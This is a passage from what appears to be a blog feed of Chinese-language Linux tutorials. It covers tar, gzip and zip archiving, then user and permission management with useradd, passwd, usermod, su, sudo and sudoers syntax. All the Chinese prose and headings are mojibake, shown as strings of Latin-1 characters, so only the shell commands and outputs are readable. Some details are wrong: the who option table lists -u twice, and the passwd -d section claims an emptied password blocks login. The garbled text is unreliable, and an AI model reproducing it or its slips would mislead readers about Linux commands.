<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# tar -cvf test.tar &#123;1..3&#125;.txt</span><br><span class="line">1.txt</span><br><span class="line">2.txt</span><br><span class="line">3.txt</span><br><span class="line">[root@rocky8:~]# ll</span><br><span class="line">total 12</span><br><span class="line">-rw-r--r--. 1 root root     0 Feb 20 15:14 1.txt</span><br><span class="line">-rw-r--r--. 1 root root     0 Feb 20 15:14 2.txt</span><br><span class="line">-rw-r--r--. 1 root root     0 Feb 20 15:14 3.txt</span><br><span class="line">-rw-r--r--. 1 root root 10240 Feb 20 15:14 test.tar</span><br><span class="line">[root@rocky8:~]# <span class="built_in">rm</span> -rf *.txt</span><br><span class="line">[root@rocky8:~]# ll</span><br><span class="line">total 12</span><br><span class="line">-rw-r--r--. 1 root root 10240 Feb 20 15:14 test.tar</span><br><span class="line">[root@rocky8:~]# tar -xvf test.tar </span><br><span class="line">1.txt</span><br><span class="line">2.txt</span><br><span class="line">3.txt</span><br><span class="line">[root@rocky8:~]# ll</span><br><span class="line">total 12</span><br><span class="line">-rw-r--r--. 1 root root     0 Feb 20 15:14 1.txt</span><br><span class="line">-rw-r--r--. 1 root root     0 Feb 20 15:14 2.txt</span><br><span class="line">-rw-r--r--. 1 root root     0 Feb 20 15:14 3.txt</span><br><span class="line">-rw-r--r--. 1 root root 10240 Feb 20 15:14 test.tar</span><br></pre></td></tr></table></figure>
<h4 id="æ–‡ä»¶å‹ç¼©è§£å‹ï¼šgzipã€bzip2">æ–‡ä»¶å‹ç¼©è§£å‹ï¼šgzipã€bzip2</h4>
<p>tarä¸gzipå‘½ä»¤ç»“åˆä½¿ç”¨å®ç°æ–‡ä»¶æ‰“åŒ…ã€å‹ç¼©ã€‚ taråªè´Ÿè´£æ‰“åŒ…æ–‡ä»¶ï¼Œä½†ä¸å‹ç¼©ï¼Œç”¨gzipå‹ç¼©taræ‰“åŒ…åçš„æ–‡ä»¶ï¼Œå…¶æ‰©å±•åä¸€èˆ¬ç”¨xxxx.tar.gzã€‚</p>
<p>gzipä½¿ç”¨æ ¼å¼å¦‚ä¸‹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gzip  [é€‰é¡¹]  è¢«å‹ç¼©æ–‡ä»¶</span><br></pre></td></tr></table></figure>
<p>å¸¸ç”¨é€‰é¡¹ï¼š</p>
<table>
<thead>
<tr>
<th>é€‰é¡¹</th>
<th>å«ä¹‰</th>
</tr>
</thead>
<tbody>
<tr>
<td>-d</td>
<td>è§£å‹æ–‡ä»¶</td>
</tr>
<tr>
<td>-r</td>
<td>å‹ç¼©æ–‡ä»¶</td>
</tr>
</tbody>
</table>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# ll *.tar*</span><br><span class="line">-rw-r--r--. 1 root root 10240 Feb 20 15:14 test.tar</span><br><span class="line">[root@rocky8:~]# gzip -r test.tar test.tar.gz  ==&gt;æˆ–è€…:gzip test.tar</span><br><span class="line">[root@rocky8:~]# ll *.tar*</span><br><span class="line">-rw-r--r--. 1 root root 131 Feb 20 15:14 test.tar.gz</span><br><span class="line">[root@rocky8:~]# gzip -d test.tar.gz </span><br><span class="line">[root@rocky8:~]# ll *.tar*</span><br><span class="line">-rw-r--r--. 1 root root 10240 Feb 20 15:14 test.tar</span><br></pre></td></tr></table></figure>
<p>tarå‘½ä»¤ä¸­-zé€‰é¡¹å¯ä»¥è°ƒç”¨gzipå®ç°äº†ä¸€ä¸ªå‹ç¼©çš„åŠŸèƒ½ï¼Œå®è¡Œä¸€ä¸ªå…ˆæ‰“åŒ…åå‹ç¼©çš„è¿‡ç¨‹ã€‚</p>
<p>å‹ç¼©ç”¨æ³•ï¼štar zcvf å‹ç¼©åŒ…åŒ…å æ–‡ä»¶1 æ–‡ä»¶2 â€¦</p>
<p>ä¾‹å¦‚ï¼š tar zcvf test.tar.gz 1.c 2.c 3.c 4.cæŠŠ 1.c 2.c 3.c 4.c å‹ç¼©æˆ test.tar.gz</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">ls</span></span><br><span class="line">1.c  2.c  3.c  4.c</span><br><span class="line">[root@rocky8:~]# tar -zcvf test.tar.gz &#123;1..4&#125;.c</span><br><span class="line">1.c</span><br><span class="line">2.c</span><br><span class="line">3.c</span><br><span class="line">4.c</span><br><span class="line">[root@rocky8:~]# <span class="built_in">ls</span></span><br><span class="line">1.c  2.c  3.c  4.c  test.tar.gz</span><br><span class="line">[root@rocky8:~]# gzip -d test.tar.gz </span><br><span class="line">[root@rocky8:~]# <span class="built_in">ls</span></span><br><span class="line">1.c  2.c  3.c  4.c  test.tar</span><br></pre></td></tr></table></figure>
<p>è§£å‹ç”¨æ³•ï¼š tar zxvf å‹ç¼©åŒ…åŒ…å</p>
<p>ä¾‹å¦‚ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">ls</span></span><br><span class="line">new.tar.gz  test.tar  test.tar.gz</span><br><span class="line">[root@rocky8:~]# tar -zxvf new.tar.gz</span><br><span class="line">1.c</span><br><span class="line">2.c</span><br><span class="line">3.c</span><br><span class="line">4.c</span><br><span class="line">[root@rocky8:~]# <span class="built_in">ls</span></span><br><span class="line">1.c  2.c  3.c  4.c  new.tar.gz  test.tar  test.tar.gz</span><br></pre></td></tr></table></figure>
<p>è§£å‹åˆ°æŒ‡å®šç›®å½•ï¼š-C ï¼ˆè§£å‹æ—¶å¯ä»¥ä¸æŒ‡å®š-zé€‰é¡¹ï¼‰</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">ls</span></span><br><span class="line">1.c  2.c  3.c  4.c  new.tar.gz  test.tar  test.tar.gz</span><br><span class="line">[root@rocky8:~]# tar -zxvf new.tar.gz -C number/</span><br><span class="line">1.c</span><br><span class="line">2.c</span><br><span class="line">3.c</span><br><span class="line">4.c</span><br><span class="line">[root@rocky8:~]# <span class="built_in">ls</span> number/</span><br><span class="line">1.c  2.c  3.c  4.c</span><br></pre></td></tr></table></figure>
<p>bzip2å‘½ä»¤è·Ÿgzipç”¨æ³•ç±»ä¼¼</p>
<p>å‹ç¼©ç”¨æ³•ï¼štar jcvf å‹ç¼©åŒ…åŒ…å æ–‡ä»¶â€¦(tar jcvf bk.tar.bz2 *.c)</p>
<p>è§£å‹ç”¨æ³•ï¼štar jxvf å‹ç¼©åŒ…åŒ…å (tar jxvf bk.tar.bz2)</p>
<h4 id="æ–‡ä»¶å‹ç¼©è§£å‹ï¼šzipã€unzip">æ–‡ä»¶å‹ç¼©è§£å‹ï¼šzipã€unzip</h4>
<p>é€šè¿‡zipå‹ç¼©æ–‡ä»¶çš„ç›®æ ‡æ–‡ä»¶ä¸éœ€è¦æŒ‡å®šæ‰©å±•åï¼Œé»˜è®¤æ‰©å±•åä¸ºzipã€‚</p>
<p>å‹ç¼©æ–‡ä»¶ï¼šzip [-r] ç›®æ ‡æ–‡ä»¶(æ²¡æœ‰æ‰©å±•å) æºæ–‡ä»¶</p>
<p>è§£å‹æ–‡ä»¶ï¼šunzip -d è§£å‹åç›®å½•æ–‡ä»¶ å‹ç¼©æ–‡ä»¶</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">ls</span></span><br><span class="line">1.txt  2.txt  3.txt  4.txt  test.tar</span><br><span class="line">[root@rocky8:~]# zip myzip *.txt</span><br><span class="line">  adding: 1.txt (stored 0%)</span><br><span class="line">  adding: 2.txt (stored 0%)</span><br><span class="line">  adding: 3.txt (stored 0%)</span><br><span class="line">  adding: 4.txt (stored 0%)</span><br><span class="line">[root@rocky8:~]# <span class="built_in">ls</span></span><br><span class="line">1.txt  2.txt  3.txt  4.txt  myzip.zip  test.tar</span><br><span class="line">[root@rocky8:~]# <span class="built_in">rm</span> -f *.txt *.tar</span><br><span class="line">[root@rocky8:~]# <span class="built_in">ls</span></span><br><span class="line">myzip.zip</span><br><span class="line">[root@rocky8:~]# unzip myzip</span><br><span class="line">Archive:  myzip.zip</span><br><span class="line"> extracting: 1.txt                   </span><br><span class="line"> extracting: 2.txt                   </span><br><span class="line"> extracting: 3.txt                   </span><br><span class="line"> extracting: 4.txt                   </span><br><span class="line">[root@rocky8:~]# <span class="built_in">ls</span></span><br><span class="line">1.txt  2.txt  3.txt  4.txt  myzip.zip</span><br></pre></td></tr></table></figure>
<p>æœ¬æ–‡å‚è€ƒï¼š</p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>ã€Linuxã€‘ç”¨æˆ·ä¸æƒé™ç®¡ç†</title>
    <url>/posts/2b99b9f0/</url>
    <content><![CDATA[<h2 id="ç”¨æˆ·ç®¡ç†">ç”¨æˆ·ç®¡ç†</h2>
<p>ç”¨æˆ·ç®¡ç†åŒ…æ‹¬ç”¨æˆ·ä¸ç»„è´¦å·çš„ç®¡ç†ã€‚</p>
<p>åœ¨Unix/Linuxç³»ç»Ÿä¸­ï¼Œä¸è®ºæ˜¯ç”±æœ¬æœºæˆ–æ˜¯è¿œç¨‹ç™»å½•ç³»ç»Ÿï¼Œæ¯ä¸ªç³»ç»Ÿéƒ½å¿…é¡»æ‹¥æœ‰ä¸€ä¸ªè´¦å·ï¼Œå¹¶ä¸”å¯¹äºä¸åŒçš„ç³»ç»Ÿèµ„æºæ‹¥æœ‰ä¸åŒçš„ä½¿ç”¨æƒé™ã€‚</p>
<p>Unix/Linuxç³»ç»Ÿä¸­çš„rootè´¦å·é€šå¸¸ç”¨äºç³»ç»Ÿçš„ç»´æŠ¤å’Œç®¡ç†ï¼Œå®ƒå¯¹Unix/Linuxæ“ä½œç³»ç»Ÿçš„æ‰€æœ‰éƒ¨åˆ†å…·æœ‰ä¸å—é™åˆ¶çš„è®¿é—®æƒé™ã€‚</p>
<p>åœ¨Unix/Linuxå®‰è£…çš„è¿‡ç¨‹ä¸­ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨åˆ›å»ºè®¸å¤šç”¨æˆ·è´¦å·ï¼Œè€Œè¿™äº›é»˜è®¤çš„ç”¨æˆ·å°±ç§°ä¸ºâ€œæ ‡å‡†ç”¨æˆ·â€ã€‚</p>
<p>åœ¨å¤§å¤šæ•°ç‰ˆæœ¬çš„Unix/Linuxä¸­ï¼Œéƒ½ä¸æ¨èç›´æ¥ä½¿ç”¨rootè´¦å·ç™»å½•ç³»ç»Ÿã€‚</p>
<span id="more"></span>
<h3 id="whoamiï¼šæŸ¥çœ‹å½“å‰ç”¨æˆ·">whoamiï¼šæŸ¥çœ‹å½“å‰ç”¨æˆ·</h3>
<p>æŸ¥çœ‹å½“å‰ç³»ç»Ÿå½“å‰è´¦å·çš„ç”¨æˆ·åã€‚å¯é€šè¿‡cat /etc/passwdæŸ¥çœ‹ç³»ç»Ÿç”¨æˆ·ä¿¡æ¯ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[Corazon@rocky8:~]$ <span class="built_in">whoami</span></span><br><span class="line">Corazon</span><br></pre></td></tr></table></figure>
<h3 id="whoï¼šæŸ¥çœ‹ç™»å½•ç”¨æˆ·">whoï¼šæŸ¥çœ‹ç™»å½•ç”¨æˆ·</h3>
<p>whoå‘½ä»¤ç”¨äºæŸ¥çœ‹å½“å‰æ‰€æœ‰ç™»å½•ç³»ç»Ÿçš„ç”¨æˆ·ä¿¡æ¯ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[Corazon@rocky8:~]$ <span class="built_in">who</span></span><br><span class="line">root     tty1         2025-02-19 12:30</span><br><span class="line">root     pts/0        2025-02-19 13:17 (10.0.0.1)</span><br></pre></td></tr></table></figure>
<p>å¸¸ç”¨é€‰é¡¹ï¼š</p>
<table>
<thead>
<tr>
<th style="text-align:center">é€‰é¡¹</th>
<th>å«ä¹‰</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">-mæˆ–am I</td>
<td>åªæ˜¾ç¤ºè¿è¡Œwhoå‘½ä»¤çš„ç”¨æˆ·åã€ç™»å½•ç»ˆç«¯å’Œç™»å½•æ—¶é—´</td>
</tr>
<tr>
<td style="text-align:center">-qæˆ–â€“count</td>
<td>åªæ˜¾ç¤ºç”¨æˆ·çš„ç™»å½•è´¦å·å’Œç™»å½•ç”¨æˆ·çš„æ•°é‡</td>
</tr>
<tr>
<td style="text-align:center">-u</td>
<td>åœ¨ç™»å½•æ—¶é—´åæ˜¾ç¤ºè¯¥ç”¨æˆ·æœ€åä¸€æ¬¡æ“ä½œåˆ°å½“å‰çš„æ—¶é—´é—´éš”</td>
</tr>
<tr>
<td style="text-align:center">â€“heading</td>
<td>æ˜¾ç¤ºåˆ—æ ‡é¢˜</td>
</tr>
<tr>
<td style="text-align:center">-u</td>
<td>æ˜¾ç¤ºPID</td>
</tr>
</tbody>
</table>
<h3 id="exitï¼šé€€å‡ºç™»å½•è´¦æˆ·">exitï¼šé€€å‡ºç™»å½•è´¦æˆ·</h3>
<p>å¦‚æœæ˜¯å›¾å½¢ç•Œé¢ï¼Œé€€å‡ºå½“å‰ç»ˆç«¯ï¼›</p>
<p>å¦‚æœæ˜¯ä½¿ç”¨sshè¿œç¨‹ç™»å½•ï¼Œé€€å‡ºç™»é™†è´¦æˆ·ï¼›</p>
<p>å¦‚æœæ˜¯åˆ‡æ¢åçš„ç™»é™†ç”¨æˆ·ï¼Œé€€å‡ºåˆ™è¿”å›ä¸Šä¸€ä¸ªç™»é™†è´¦å·ã€‚</p>
<h3 id="useraddï¼šæ·»åŠ ç”¨æˆ·è´¦å·">useraddï¼šæ·»åŠ ç”¨æˆ·è´¦å·</h3>
<p>åœ¨Unix/Linuxä¸­æ·»åŠ ç”¨æˆ·è´¦å·å¯ä»¥ä½¿ç”¨adduseræˆ–useraddå‘½ä»¤ï¼Œå› ä¸ºadduserå‘½ä»¤æ˜¯æŒ‡å‘useraddå‘½ä»¤çš„ä¸€ä¸ªé“¾æ¥ï¼Œå› æ­¤ï¼Œè¿™ä¸¤ä¸ªå‘½ä»¤çš„ä½¿ç”¨æ ¼å¼å®Œå…¨ä¸€æ ·ã€‚</p>
<p>useraddå‘½ä»¤çš„ä½¿ç”¨æ ¼å¼å¦‚ä¸‹ï¼š useradd [å‚æ•°] æ–°å»ºç”¨æˆ·è´¦å·</p>
<table>
<thead>
<tr>
<th>å‚æ•°</th>
<th>å«ä¹‰</th>
</tr>
</thead>
<tbody>
<tr>
<td>-d</td>
<td>æŒ‡å®šç”¨æˆ·ç™»å½•ç³»ç»Ÿæ—¶çš„ä¸»ç›®å½•</td>
</tr>
<tr>
<td>-m</td>
<td>è‡ªåŠ¨å»ºç«‹ç›®å½•ï¼ŒæœªæŒ‡å®š-då‚æ•°æ—¶ä¼šåœ¨/home/{å½“å‰ç”¨æˆ·}ç›®å½•ä¸‹å»ºç«‹ä¸»ç›®å½•</td>
</tr>
<tr>
<td>-g</td>
<td>æŒ‡å®šç»„åç§°</td>
</tr>
</tbody>
</table>
<p>ç›¸å…³è¯´æ˜ï¼š</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>Linuxæ¯ä¸ªç”¨æˆ·éƒ½è¦æœ‰ä¸€ä¸ªä¸»ç›®å½•ï¼Œä¸»ç›®å½•å°±æ˜¯ç¬¬ä¸€æ¬¡ç™»é™†ç³»ç»Ÿï¼Œç”¨æˆ·çš„é»˜è®¤å½“å‰ç›®å½•(/home/ç”¨æˆ·)ï¼›</p>
</li>
<li class="lvl-2">
<p>æ¯ä¸€ä¸ªç”¨æˆ·å¿…é¡»æœ‰ä¸€ä¸ªä¸»ç›®å½•ï¼Œæ‰€ä»¥ç”¨useraddåˆ›å»ºç”¨æˆ·çš„æ—¶å€™ï¼Œä¸€å®šç»™ç”¨æˆ·æŒ‡å®šä¸€ä¸ªä¸»ç›®å½•ï¼›</p>
</li>
<li class="lvl-2">
<p>å¦‚æœåˆ›å»ºç”¨æˆ·çš„æ—¶å€™ï¼Œä¸æŒ‡å®šç»„åï¼Œé‚£ä¹ˆç³»ç»Ÿä¼šè‡ªåŠ¨åˆ›å»ºä¸€ä¸ªå’Œç”¨æˆ·åä¸€æ ·çš„ç»„åã€‚</p>
</li>
<li class="lvl-2">
<p>ä½¿ç”¨useråˆ›å»ºè´¦æˆ·åéœ€è¦ä½¿ç”¨å‘½ä»¤<code>passwd æ–°å»ºç”¨æˆ·</code>ä¸ºæ–°è´¦æˆ·è®¾ç½®å¯†ç åæ‰èƒ½ç™»é™†</p>
</li>
</ul>
<p>è‹¥åˆ›å»ºç”¨æˆ·æ—¶æœªæŒ‡å®šå®¶ç›®å½•ï¼ŒåæœŸå¯é€šè¿‡<code>usermod -d /home/abc abc</code>æŒ‡å®š</p>
<table>
<thead>
<tr>
<th>å‘½ä»¤</th>
<th>å«ä¹‰</th>
</tr>
</thead>
<tbody>
<tr>
<td>useradd -d /home/abc abc -m</td>
<td>åˆ›å»ºabcç”¨æˆ·ï¼Œå¦‚æœ/home/abcç›®å½•ä¸å­˜åœ¨ï¼Œå°±è‡ªåŠ¨åˆ›å»ºè¿™ä¸ªç›®å½•ï¼ŒåŒæ—¶ç”¨æˆ·å±äºabcç»„</td>
</tr>
<tr>
<td>useradd -d /home/a a -g test -m</td>
<td>åˆ›å»ºä¸€ä¸ªç”¨æˆ·åå­—å«aï¼Œä¸»ç›®å½•åœ¨/home/aï¼Œå¦‚æœä¸»ç›®å½•ä¸å­˜åœ¨ï¼Œå°±è‡ªåŠ¨åˆ›å»ºä¸»ç›®å½•ï¼ŒåŒæ—¶ç”¨æˆ·å±äºtestç»„</td>
</tr>
<tr>
<td>cat /etc/passwd</td>
<td>æŸ¥çœ‹ç³»ç»Ÿå½“å‰ç”¨æˆ·å</td>
</tr>
</tbody>
</table>
<h3 id="è®¾ç½®ç”¨æˆ·å¯†ç ï¼špasswd">è®¾ç½®ç”¨æˆ·å¯†ç ï¼špasswd</h3>
<p>è¶…çº§ç”¨æˆ·å¯ä»¥ä¸ºè‡ªå·±å’Œå…¶ä»–ç”¨æˆ·æŒ‡å®šå£ä»¤ï¼Œæ™®é€šç”¨æˆ·åªèƒ½ç”¨å®ƒä¿®æ”¹è‡ªå·±çš„å£ä»¤ã€‚å‘½ä»¤çš„æ ¼å¼ä¸ºï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">passwd é€‰é¡¹ ç”¨æˆ·å</span><br></pre></td></tr></table></figure>
<p>å¯ä½¿ç”¨çš„é€‰é¡¹ï¼š</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>-l é”å®šå£ä»¤ï¼Œå³ç¦ç”¨è´¦å·ã€‚</p>
</li>
<li class="lvl-2">
<p>-u å£ä»¤è§£é”ã€‚</p>
</li>
<li class="lvl-2">
<p>-d ä½¿è´¦å·æ— å£ä»¤ã€‚</p>
</li>
<li class="lvl-2">
<p>-f å¼ºè¿«ç”¨æˆ·ä¸‹æ¬¡ç™»å½•æ—¶ä¿®æ”¹å£ä»¤ã€‚</p>
</li>
</ul>
<p>æ™®é€šç”¨æˆ·ä¿®æ”¹è‡ªå·±çš„å£ä»¤æ—¶ï¼Œpasswdå‘½ä»¤ä¼šå…ˆè¯¢é—®åŸå£ä»¤ï¼ŒéªŒè¯åå†è¦æ±‚ç”¨æˆ·è¾“å…¥ä¸¤éæ–°å£ä»¤ï¼Œå¦‚æœä¸¤æ¬¡è¾“å…¥çš„å£ä»¤ä¸€è‡´ï¼Œåˆ™å°†è¿™ä¸ªå£ä»¤æŒ‡å®šç»™ç”¨æˆ·ï¼›è€Œè¶…çº§ç”¨æˆ·ä¸ºç”¨æˆ·æŒ‡å®šå£ä»¤æ—¶ï¼Œå°±ä¸éœ€è¦çŸ¥é“åŸå£ä»¤ã€‚</p>
<p>å‡è®¾å½“å‰ç”¨æˆ·æ˜¯samï¼Œåˆ™ä¸‹é¢çš„å‘½ä»¤ä¿®æ”¹è¯¥ç”¨æˆ·è‡ªå·±çš„å£ä»¤ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ passwd </span><br><span class="line">Old password:****** </span><br><span class="line">New password:******* </span><br><span class="line">Re-enter new password:*******</span><br></pre></td></tr></table></figure>
<p>å¦‚æœæ˜¯è¶…çº§ç”¨æˆ·ï¼Œå¯ä»¥ç”¨ä¸‹åˆ—å½¢å¼æŒ‡å®šä»»ä½•ç”¨æˆ·çš„å£ä»¤ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># passwd sam </span></span><br><span class="line">New password:******* </span><br><span class="line">Re-enter new password:*******</span><br></pre></td></tr></table></figure>
<p>ä½¿ç”¨rootè´¦æˆ·ä¸ºç”¨æˆ·æŒ‡å®šç©ºå£ä»¤æ—¶ï¼Œæ‰§è¡Œä¸‹åˆ—å½¢å¼çš„å‘½ä»¤ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">passwd -d sam</span><br></pre></td></tr></table></figure>
<p>æ­¤å‘½ä»¤å°†ç”¨æˆ· sam çš„å£ä»¤åˆ é™¤ï¼Œè¿™æ ·ç”¨æˆ· sam ä¸‹ä¸€æ¬¡ç™»å½•æ—¶ï¼Œç³»ç»Ÿå°±ä¸å†å…è®¸è¯¥ç”¨æˆ·ç™»å½•äº†ã€‚</p>
<p>passwd å‘½ä»¤è¿˜å¯ä»¥ç”¨ -l(lock) é€‰é¡¹é”å®šæŸä¸€ç”¨æˆ·ï¼Œä½¿å…¶ä¸èƒ½ç™»å½•ï¼Œä¾‹å¦‚ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">passwd -l sam</span><br></pre></td></tr></table></figure>
<h3 id="usermodï¼šä¿®æ”¹ç”¨æˆ·">usermodï¼šä¿®æ”¹ç”¨æˆ·</h3>
<p>å¸¸ç”¨çš„é€‰é¡¹åŒ…æ‹¬<code>-c, -d, -m, -g, -G, -s, -uä»¥åŠ-oç­‰</code>ï¼Œè¿™äº›é€‰é¡¹çš„æ„ä¹‰ä¸<code>useradd</code>å‘½ä»¤ä¸­çš„é€‰é¡¹ä¸€æ ·ï¼Œå¯ä»¥ä¸ºç”¨æˆ·æŒ‡å®šæ–°çš„èµ„æºå€¼ ã€‚</p>
<p>ä¿®æ”¹ç”¨æˆ·æ‰€åœ¨ç»„ï¼šusermod -g ç”¨æˆ·ç»„ ç”¨æˆ·å</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">usermod -g <span class="built_in">test</span> abc</span><br></pre></td></tr></table></figure>
<p>æ”¹abcç”¨æˆ·çš„å®¶ç›®å½•ä½ç½®ï¼šusermod -d å®¶ç›®å½• ç”¨æˆ·å</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">usermod -d /home/abc abc</span><br></pre></td></tr></table></figure>
<p>é€‰é¡¹<code>-l æ–°ç”¨æˆ·å</code>æŒ‡å®šä¸€ä¸ªæ–°çš„è´¦å·ï¼Œå¯ä¿®æ”¹ç”¨æˆ·åï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python@ubuntu:~/txt$ <span class="built_in">tail</span> /etc/passwd -n 1 </span><br><span class="line">aaa:x:1001:1001::/home/aaa:</span><br><span class="line">python@ubuntu:~/txt$ <span class="built_in">sudo</span> usermod -l bbb -d /home/bbb aaa   </span><br><span class="line">python@ubuntu:~/txt$ <span class="built_in">tail</span> /etc/passwd -n 1               </span><br><span class="line">bbb:x:1001:1001::/home/bbb:</span><br></pre></td></tr></table></figure>
<h3 id="åˆ é™¤ç”¨æˆ·ï¼šuserdel">åˆ é™¤ç”¨æˆ·ï¼šuserdel</h3>
<table>
<thead>
<tr>
<th>å‘½ä»¤</th>
<th>å«ä¹‰</th>
</tr>
</thead>
<tbody>
<tr>
<td>userdel abc(ç”¨æˆ·å)</td>
<td>åˆ é™¤abcç”¨æˆ·ï¼Œä½†ä¸ä¼šè‡ªåŠ¨åˆ é™¤ç”¨æˆ·çš„ä¸»ç›®å½•</td>
</tr>
<tr>
<td>userdel -r abc(ç”¨æˆ·å)</td>
<td>åˆ é™¤ç”¨æˆ·ï¼ŒåŒæ—¶åˆ é™¤ç”¨æˆ·çš„ä¸»ç›®å½•</td>
</tr>
</tbody>
</table>
<h3 id="åˆ‡æ¢ç”¨æˆ·ï¼šsu">åˆ‡æ¢ç”¨æˆ·ï¼šsu</h3>
<p>suåé¢å¯ä»¥åŠ â€œ-â€ä¼šå°†å½“å‰çš„å·¥ä½œç›®å½•è‡ªåŠ¨è½¬æ¢åˆ°åˆ‡æ¢åçš„ç”¨æˆ·ä¸»ç›®å½•.</p>
<table>
<thead>
<tr>
<th>å‘½ä»¤</th>
<th>å«ä¹‰</th>
</tr>
</thead>
<tbody>
<tr>
<td>su</td>
<td>åˆ‡æ¢åˆ°rootç”¨æˆ·</td>
</tr>
<tr>
<td>su root</td>
<td>åˆ‡æ¢åˆ°rootç”¨æˆ·</td>
</tr>
<tr>
<td>su -</td>
<td>åˆ‡æ¢åˆ°rootç”¨æˆ·ï¼ŒåŒæ—¶åˆ‡æ¢ç›®å½•åˆ°/root</td>
</tr>
<tr>
<td>su - root</td>
<td>åˆ‡æ¢åˆ°rootç”¨æˆ·ï¼ŒåŒæ—¶åˆ‡æ¢ç›®å½•åˆ°/root</td>
</tr>
<tr>
<td>su æ™®é€šç”¨æˆ·</td>
<td>åˆ‡æ¢åˆ°æ™®é€šç”¨æˆ·</td>
</tr>
<tr>
<td>su - æ™®é€šç”¨æˆ·</td>
<td>åˆ‡æ¢åˆ°æ™®é€šç”¨æˆ·ï¼ŒåŒæ—¶åˆ‡æ¢æ™®é€šç”¨æˆ·æ‰€åœ¨çš„ç›®å½•</td>
</tr>
</tbody>
</table>
<p>æ³¨æ„ï¼šå¯¹äºubuntuå¹³å°ï¼Œåªèƒ½é€šè¿‡sudo suè¿›å…¥rootè´¦å·ã€‚</p>
<p>sudoå…è®¸ç³»ç»Ÿç®¡ç†å‘˜è®©æ™®é€šç”¨æˆ·æ‰§è¡Œä¸€äº›æˆ–è€…å…¨éƒ¨çš„rootå‘½ä»¤çš„ä¸€ä¸ªå·¥å…·ã€‚</p>
<h3 id="sudoï¼šä»¥rootèº«ä»½æ‰§è¡ŒæŒ‡ä»¤">sudoï¼šä»¥rootèº«ä»½æ‰§è¡ŒæŒ‡ä»¤</h3>
<p>sudoå‘½ä»¤å¯ä»¥ä¸´æ—¶è·å–rootæƒé™</p>
<p>ä½¿ç”¨æƒé™ï¼šåœ¨ /etc/sudoers ä¸­æœ‰å‡ºç°çš„ä½¿ç”¨è€…ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">æ˜¾ç¤ºå‡ºè‡ªå·±ï¼ˆæ‰§è¡Œ <span class="built_in">sudo</span> çš„ä½¿ç”¨è€…ï¼‰çš„æƒé™</span><br><span class="line"><span class="built_in">sudo</span> -l</span><br><span class="line">ä»¥rootæƒé™æ‰§è¡Œä¸Šä¸€æ¡å‘½ä»¤</span><br><span class="line"><span class="built_in">sudo</span> !!</span><br></pre></td></tr></table></figure>
<p>sudoersæ–‡ä»¶é…ç½®è¯­æ³•</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">user  MACHINE=COMMANDS</span><br><span class="line">ç”¨æˆ· ç™»å½•çš„ä¸»æœº=ï¼ˆå¯ä»¥å˜æ¢çš„èº«ä»½ï¼‰ å¯ä»¥æ‰§è¡Œçš„å‘½ä»¤  </span><br></pre></td></tr></table></figure>
<p>ä¾‹å­ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">å…è®¸rootç”¨æˆ·æ‰§è¡Œä»»æ„è·¯å¾„ä¸‹çš„ä»»æ„å‘½ä»¤ </span><br><span class="line">root    ALL=(ALL)       ALL</span><br><span class="line">å…è®¸wheelç”¨æˆ·ç»„ä¸­çš„ç”¨æˆ·æ‰§è¡Œæ‰€æœ‰å‘½ä»¤  </span><br><span class="line">%wheel        ALL=(ALL)       ALL</span><br><span class="line">å…è®¸wheelç”¨æˆ·ç»„ä¸­çš„ç”¨æˆ·åœ¨ä¸è¾“å…¥è¯¥ç”¨æˆ·çš„å¯†ç çš„æƒ…å†µä¸‹ä½¿ç”¨æ‰€æœ‰å‘½ä»¤</span><br><span class="line">%wheel        ALL=(ALL)       NOPASSWD: ALL</span><br><span class="line">å…è®¸supportç”¨æˆ·åœ¨EPGçš„æœºå™¨ä¸Šä¸è¾“å…¥å¯†ç çš„æƒ…å†µä¸‹ä½¿ç”¨SQUIDä¸­çš„å‘½ä»¤</span><br><span class="line">Cmnd_Alias   SQUID = /opt/vtbin/squid_refresh, /sbin/service, /bin/rm</span><br><span class="line">Host_Alias   EPG = 192.168.1.1, 192.168.1.2</span><br><span class="line">support EPG=(ALL) NOPASSWD: SQUID</span><br></pre></td></tr></table></figure>
<h3 id="æ·»åŠ ã€åˆ é™¤ç»„è´¦å·ï¼šgroupaddã€groupdel">æ·»åŠ ã€åˆ é™¤ç»„è´¦å·ï¼šgroupaddã€groupdel</h3>
<p>groupadd æ–°å»ºç»„è´¦å· groupdel ç»„è´¦å· cat /etc/group æŸ¥çœ‹ç”¨æˆ·ç»„</p>
